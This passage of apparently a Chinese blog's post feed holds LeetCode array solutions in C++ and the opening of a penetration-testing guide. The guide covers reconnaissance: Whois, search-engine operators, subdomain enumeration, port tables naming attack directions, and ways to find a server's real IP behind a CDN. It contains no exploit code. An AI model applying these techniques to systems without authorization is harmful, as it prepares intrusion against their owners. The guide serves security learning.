<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [0,0,1,1,1,2,2,3,3,4]</span><br><span class="line">输出：5, nums &#x3D; [0,1,2,3,4]</span><br><span class="line">解释：函数应该返回新的长度 5 ， 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4 。不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>
<p>我的答案:(未通过)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = nums.size();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(length==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">        <span class="keyword">if</span>(length==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">if</span>(nums[<span class="number">0</span>]==nums[<span class="number">1</span>])</span><br><span class="line">        	&#123;</span><br><span class="line">        		length--;</span><br><span class="line">        		<span class="keyword">return</span> length;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;length;j++)</span><br><span class="line">        	&#123;</span><br><span class="line">        		<span class="keyword">if</span>(nums[i]==nums[j])</span><br><span class="line">        		&#123;</span><br><span class="line">        			<span class="keyword">for</span>(<span class="keyword">int</span> k=j;k&lt;length;k++)</span><br><span class="line">        			&#123;</span><br><span class="line">        				nums[k]=nums[k+<span class="number">1</span>];</span><br><span class="line">					&#125;</span><br><span class="line">					length--;</span><br><span class="line">					j--;<span class="comment">//判断相同后,将后面元素向前移动一位,此时仍需判断该位置的元素</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125; </span><br><span class="line">		 <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>参考答案:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">1</span>, slow = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (fast &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[fast] != nums[fast - <span class="number">1</span>]) &#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                ++slow;</span><br><span class="line">            &#125;</span><br><span class="line">            ++fast;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210602164810127.png" alt=""></p>
<h2 id="买卖股票的最佳时机-II"><a href="#买卖股票的最佳时机-II" class="headerlink" title="买卖股票的最佳时机 II"></a><a href="https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/x2zsx1/">买卖股票的最佳时机 II</a></h2><p>给定一个数组prices其中 prices[i] 是一支给定股票第 i 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<p> 示例 1:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: prices = [<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">输出: <span class="number">7</span></span><br><span class="line">解释: 在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">3</span> 天（股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span><span class="number">-1</span> = <span class="number">4</span> 。</span><br><span class="line">     随后，在第 <span class="number">4</span> 天（股票价格 = <span class="number">3</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">6</span><span class="number">-3</span> = <span class="number">3</span> 。</span><br></pre></td></tr></table></figure>
<p>示例 2:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: prices = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">输出: <span class="number">4</span></span><br><span class="line">解释: 在第 <span class="number">1</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天 （股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span><span class="number">-1</span> = <span class="number">4</span> 。</span><br><span class="line">     注意你不能在第 <span class="number">1</span> 天和第 <span class="number">2</span> 天接连购买股票，之后再将它们卖出。因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</span><br></pre></td></tr></table></figure>
<p>示例 3:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: prices = [<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出: <span class="number">0</span></span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>
<p>我的答案:(更优)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length=prices.size();</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]&lt;prices[j])</span><br><span class="line">            sum+=prices[j]-prices[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>参考答案:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.size();</span><br><span class="line">        <span class="keyword">int</span> dp0 = <span class="number">0</span>, dp1 = -prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> newDp0 = max(dp0, dp1 + prices[i]);</span><br><span class="line">            <span class="keyword">int</span> newDp1 = max(dp1, dp0 - prices[i]);</span><br><span class="line">            dp0 = newDp0;</span><br><span class="line">            dp1 = newDp1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="旋转数组"><a href="#旋转数组" class="headerlink" title="旋转数组"></a><a href="https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/x2skh7/">旋转数组</a></h2><p>给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。</p>
<p>进阶：</p>
<p>尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。<br>你可以使用空间复杂度为 O(1) 的 原地 算法解决这个问题吗？</p>
<p>示例 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [1,2,3,4,5,6,7], k &#x3D; 3</span><br><span class="line">输出: [5,6,7,1,2,3,4]</span><br><span class="line">解释:</span><br><span class="line">向右旋转 1 步: [7,1,2,3,4,5,6]</span><br><span class="line">向右旋转 2 步: [6,7,1,2,3,4,5]</span><br><span class="line">向右旋转 3 步: [5,6,7,1,2,3,4]</span><br></pre></td></tr></table></figure>
<p>示例 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,-100,3,99], k &#x3D; 2</span><br><span class="line">输出：[3,99,-1,-100]</span><br><span class="line">解释: </span><br><span class="line">向右旋转 1 步: [99,-1,-100,3]</span><br><span class="line">向右旋转 2 步: [3,99,-1,-100]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试实战指南</title>
    <url>/article/8240bef7.html</url>
    <content><![CDATA[<h1 id="渗透测试实战指南"><a href="#渗透测试实战指南" class="headerlink" title="渗透测试实战指南"></a>渗透测试实战指南</h1><a id="more"></a>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>进行渗透测试之前,最重要的一步就是信息收集,在这个阶段,我们要尽可能地收集目标组织的信息.所谓“知己知彼,百战不殆”,我们越是了解测试目标,测试的工作就越容易.在信息收集中,最主要的就是收集服务器的配置信息和网站的敏感信息,其中包括域名及子域名信息、目标网站系统、CMS指纹、目标网站真实IP、开放的端口等.换句话说,只要是与目标网站相关的信息,我们都应该去尽量搜集.</p>
<h3 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h3><p>知道目标的域名之后,我们要做的第一件事就是获取域名的注册信息,包括该域名的DNS服务器信息和注册人的联系信息等.</p>
<h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h4><p>Whois是一个标准的互联网协议,可用于收集网络注册信息,注册的域名、IP地址等信息.简单来说,Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库(如域名所有人、域名注册商).在Whois查询中,得到注册人的姓名和邮箱信息通常对测试个人站点非常有用,因为我们可以通过搜索引擎和社交网络挖掘<br>出域名所有人的很多信息.对中小站点而言,域名所有人往往就是管理员.<br>在Kali系统中,Whois已经默认安装,只需输入要查询的域名即可.</p>
<p><img src="https://i.loli.net/2021/05/12/tvUKdMEkLob1z96.png" alt=""></p>
<p>在线Whois查询的常用网站有爱站工具网(<a href="https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等">https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等</a>.</p>
<h4 id="备案查询"><a href="#备案查询" class="headerlink" title="备案查询"></a>备案查询</h4><p>网站备案是根据国家法律法规规定,需要网站的所有者向国家有关部门申请的备案,这是国家信息产业部对网站的一种管理,为了防止在网上从事非法的网站经营活动的发生.主要针对国内网站,如果网站搭建在其他国家,则不需要进行备案.</p>
<p>常用的网站有以下这两个:</p>
<ul>
<li>站长工具: <a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></li>
<li>天眼查: <a href="http://www.tianyancha.com/">http://www.tianyancha.com/</a></li>
</ul>
<h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><p>Google是世界上最强的搜索引擎之一,对一位渗透测试者而言,它可能是一款绝佳的黑客工具.我们可以通过构造特殊的关键字语法来搜索互联网上的相关敏感信息.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>site</td>
<td>指定域名</td>
</tr>
<tr>
<td>inurl</td>
<td>URL中存在关键字的网页</td>
</tr>
<tr>
<td>intext</td>
<td>网页正文中的关键字</td>
</tr>
<tr>
<td>filetype</td>
<td>指定文件类型</td>
</tr>
<tr>
<td>intitle</td>
<td>网页标题中的关键字</td>
</tr>
<tr>
<td>link</td>
<td>link:baidu.com即表示返回所有和baidu.com做了链接的URL</td>
</tr>
<tr>
<td>info</td>
<td>查找指定站点的一些基本信息</td>
</tr>
<tr>
<td>cache</td>
<td>搜索Google里关于某些内容的缓存</td>
</tr>
</tbody>
</table>
</div>
<p>利用Google搜索,我们可以很轻松地得到想要的信息,还可以用它来收集数据库文件、SQL注入、配置信息、源代码泄露、未授权访问和robots.txt等敏感信息.</p>
<p>当然,不仅是Google搜索引擎,这种搜索思路还可以用在百度、雅虎、Bing、<a href="https://www.shodan.io/">Shodan</a>等搜索引擎上,其语法也大同小异.</p>
<p>另外,通过Burp Suite的Repeater功能同样可以获取一些服务器的信息,如运行的Server类型及版本、PHP的版本信息等.针对不同的Server,可以利用不同的漏洞进行测试.</p>
<p>除此之外,也可以尝试在GitHub上寻找相关敏感信息,如数据库连接信息、邮箱密码、uc-key、阿里的osskey,有时还可以找到泄露的源代码等.</p>
<h3 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h3><p>子域名也就是二级域名,是指顶级域名下的域名.假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的,因为对于这种规模的目标,一般其主域都是重点防护区域,所以不如先进入目标的某个子域,然后再想办法迂回接近真正的目标,这无疑是个比较好的选择.</p>
<h4 id="1-子域名检测工具"><a href="#1-子域名检测工具" class="headerlink" title="1.子域名检测工具"></a>1.子域名检测工具</h4><p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、Maltego CE等.</p>
<h4 id="2-搜索引擎枚举"><a href="#2-搜索引擎枚举" class="headerlink" title="2.搜索引擎枚举"></a>2.搜索引擎枚举</h4><p>可利用搜索引擎相关语法搜索子域名</p>
<h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4><p>很多第三方服务汇聚了大量DNS数据集,可通过它们检索某个给定域名的子域名.只需在其搜索栏中输入域名,就可检索到相关的域名信息.</p>
<p>读者也可以利用DNSdumpster网站(<a href="https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域">https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域</a>.</p>
<h4 id="4-证书透明度公开日志枚举"><a href="#4-证书透明度公开日志枚举" class="headerlink" title="4.证书透明度公开日志枚举"></a>4.证书透明度公开日志枚举</h4><p>证书透明度(Certificate Transparency, CT)是证书授权机构(CA)的一个项目,证书授权机构会将每个SSL/TLS证书发布到公共日志中.一个SSL/TLS证书通常包含域名、子域名和邮件地址,这些也经常成为攻击者非常希望获得的有用信息.查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志.</p>
<h3 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h3><p>在渗透测试的过程中,对端口信息的收集是一个很重要的过程,通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务,就可以对症下药,便于我们渗透目标服务器.</p>
<p>所以在端口渗透信息的收集过程中,我们需要关注常见应用的默认端口和在端口上运行的服务.最常见的扫描工具就是Nmap、无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具.</p>
<p>常见的端口及其说明,以及攻击方向汇总如下：</p>
<h4 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/22/69</td>
<td>Ftp/<a href="https://www.cnblogs.com/qinlulu/p/13204788.html">Tftp</a>文件传输协议</td>
<td>允许匿名的上传、下载、爆破和嗅探操作</td>
</tr>
<tr>
<td>2049</td>
<td><a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/9719420?fromtitle=NFS&amp;fromid=812203">Nfs</a>服务</td>
<td>配置不当</td>
</tr>
<tr>
<td>139</td>
<td><a href="https://baike.baidu.com/item/samba/455025">Samba</a>服务</td>
<td>爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td>389</td>
<td><a href="https://baike.baidu.com/item/%E8%BD%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE/10493115?fromtitle=LDAP&amp;fromid=2875565">Ldap</a>轻型目录访问协议</td>
<td>注入、允许匿名访问、弱口令</td>
</tr>
</tbody>
</table>
</div>
<h4 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH远程连接</td>
<td>爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td>23</td>
<td>Telnet远程连接</td>
<td>爆破、嗅探、弱口令</td>
</tr>
<tr>
<td>3389</td>
<td><a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE/9978980?fromtitle=RDP&amp;fromid=2986499">Rdp</a>远程桌面连接</td>
<td><a href="https://blog.csdn.net/Auuuuuuuu/article/details/88902791">Shift后门</a>(需要Windows Server 2003以下的系统)、爆破</td>
</tr>
<tr>
<td>5900</td>
<td>VNC</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>5632</td>
<td><a href="https://baike.baidu.com/item/pcAnywhere/866833">PyAnywhere</a>服务</td>
<td>抓密码、代码执行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="web应用服务端口"><a href="#web应用服务端口" class="headerlink" title="web应用服务端口"></a>web应用服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>80/443/8080</td>
<td>常见的Web服务端口</td>
<td>Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>7001/7002</td>
<td><a href="https://baike.baidu.com/item/weblogic">WebLogic</a>控制台</td>
<td>Java反序列化、弱口令</td>
</tr>
<tr>
<td>8080/8089</td>
<td>Jboss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9090</td>
<td>WebSphere控制台</td>
<td>Java反序列化、弱口令</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish控制台</td>
<td>弱口令</td>
</tr>
<tr>
<td>1352</td>
<td>Lotus domino邮件服务</td>
<td>弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td>10000</td>
<td>Webmin-Web控制面板</td>
<td>弱口令</td>
</tr>
</tbody>
</table>
</div>
<h4 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>注入、提权、爆破</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL数据库</td>
<td>注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle数据库</td>
<td>TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL数据库</td>
<td>爆破、注入、弱口令</td>
</tr>
<tr>
<td>27017/27018</td>
<td>MongoDB</td>
<td>爆破、未授权访问</td>
</tr>
<tr>
<td>6379</td>
<td>Redis数据库</td>
<td>可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td>5000</td>
<td>SysBase/DB2数据库</td>
<td>爆破、注入</td>
</tr>
</tbody>
</table>
</div>
<h4 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>25</td>
<td>SMTP邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>110</td>
<td>POP3协议</td>
<td>爆破、嗅探</td>
</tr>
<tr>
<td>143</td>
<td>IMAP协议</td>
<td>爆破</td>
</tr>
</tbody>
</table>
</div>
<h4 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>53</td>
<td>DNS域名系统</td>
<td>允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td>67/68</td>
<td>DHCP服务</td>
<td>劫持、欺骗</td>
</tr>
<tr>
<td>161</td>
<td>SNMP协议</td>
<td>爆破、搜集目标内网信息</td>
</tr>
</tbody>
</table>
</div>
<h4 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>2181</td>
<td>Zookeeper服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>8069</td>
<td>Zabbix服务</td>
<td>远程执行、SQL注入</td>
</tr>
<tr>
<td>9200/9300</td>
<td>Elasticsearch服务</td>
<td>远程执行</td>
</tr>
<tr>
<td>11211</td>
<td>Memcache服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>512/513/514</td>
<td>Linux Rexee服务</td>
<td>爆破、Rlogin登录</td>
</tr>
<tr>
<td>873</td>
<td>Rsync服务</td>
<td>匿名访问、文件上传</td>
</tr>
<tr>
<td>3690</td>
<td>Svn服务</td>
<td>Svn泄露、未授权访问</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>此处所说的指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别等。</p>
<p>应用程序一般在html、js、 css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator-=wordpress 3.xx,，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS,所以叫作指纹识别。</p>
<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<p>CMS(Content Management System)又称整站系统或文章系统。常见的CMS有Dedecms (织梦)、Discuz、 PHPWEB、 PHPWind、PHPCMS、ECShop、Dvbbs、 SiteWeaver、 ASPCMS、帝国、Z- Blog、WordPress等。</p>
<p>代表工具有御剑Web指纹识别、WhatWeb、 WebRobo、 椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
<p>除了这些工具，还可以利用一些在线网站查询CMS指纹识别:</p>
<ul>
<li>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li>
<li>云悉指纹: <a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li>
</ul>
<h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN,可以直接通过<a href="http://www.ip138.com">ip138</a>获取目标的一些IP及域名信息。这里主要讲解在以下这几种情况下，如何绕过CDN寻找目标服务器的真实IP。</p>
<h4 id="1-目标服务器存在CDN"><a href="#1-目标服务器存在CDN" class="headerlink" title="1.目标服务器存在CDN"></a>1.目标服务器存在CDN</h4><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说得简单点，就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源(例如静态的html、css、js图片等文件)直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
<p>所以如果渗透目标购买了CDN服务，可以直接ping目标的域名，但得到的并非真正的目标Web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们没法直接得到目标的真实IP段范围。</p>
<h4 id="2-判断目标是否使用了CDN"><a href="#2-判断目标是否使用了CDN" class="headerlink" title="2.判断目标是否使用了CDN"></a>2.判断目标是否使用了CDN</h4><p>通常会通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了<br>CDN.</p>
<p>还可以利用在线网站<a href="https://www.17ce.com">17CE</a>进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p>
<h4 id="3-绕过CDN寻找真实IP"><a href="#3-绕过CDN寻找真实IP" class="headerlink" title="3.绕过CDN寻找真实IP"></a>3.绕过CDN寻找真实IP</h4><p>在确认了目标确实用了CDN以后，就需要绕过CDN寻找目标的真实IP，下面介绍一些常规的方法。</p>
<ul>
<li>内部邮箱源。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的)</li>
<li>扫描网站测试文件.如phpinfo、test等,从而找到目标的真实IP。</li>
<li>分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</li>
<li>国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不<br>一定了。因此，通过国外在线代理网站<a href="https://asm.ca.com/en/ping.php">App Synthetic Monitor</a>访问，可能会得到真实的IP</li>
<li>查询域名的解析记录。也许目标很久以前并没有用过CDN，所以可以通过<br>网站<a href="https://www.netcraft.com/">NETCRAFT</a>来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</li>
<li>如果目标网站有自己的App,可以尝试利用Fiddler或Burp Suite抓取App的<br>请求，从里面找到目标的真实IP。</li>
<li>绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的<br>CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站<a href="http://www.crimeflare.com/">Cloud<br>FlareWatch</a>对CloudFlare客户网站进行真实IP查询</li>
</ul>
<p>参考资料:</p>
<p><a href="https://www.uedbox.com/post/65312/">13种绕过CDN查找真实IP的方法</a></p>
<p><a href="https://www.ddosi.com/cdnip/">绕过cdn查找网站真实ip借助网络空间搜索引擎</a></p>
<h4 id="4-验证获取的IP"><a href="#4-验证获取的IP" class="headerlink" title="4.验证获取的IP"></a>4.验证获取的IP</h4><p>找到目标的真实IP以后，如何验证其真实性呢?如果是Web,最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样;或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，观察响应结果是否为目标站点。</p>
<h3 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h3><p>在渗透测试中，探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理页面、文件上传界面，甚至可能扫描出网站的源代码。</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py(轻量级快速单文件目录后台扫描)、Sensitivefilescan(轻量级快速单文件目录后台扫描)、Weakfilescan(轻量级快速单文件目录后台扫描)等工具。</p>
<p>除此之外，还可以利用很多在线工具站，效果也相当不错，这里推荐一个: <a href="http://www.webscan.cc/">WebScan</a>.</p>
